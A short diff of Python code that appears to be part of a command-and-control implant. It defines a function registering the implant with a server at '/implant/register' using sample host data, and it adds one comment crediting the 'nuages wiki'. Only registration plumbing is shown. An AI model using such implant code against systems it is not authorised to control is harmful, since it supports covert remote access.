@@ -14,6 +14,7 @@ else:
 URL = "http://"+parsed.i+":"+port+"/implant/register"
 def registerImplant(URL):
    #Register the implant
+   #pulled right out of nuages wiki
    heads = {'content-type': 'application/json'}
    regData = {
   "hostname": "John-PC", 
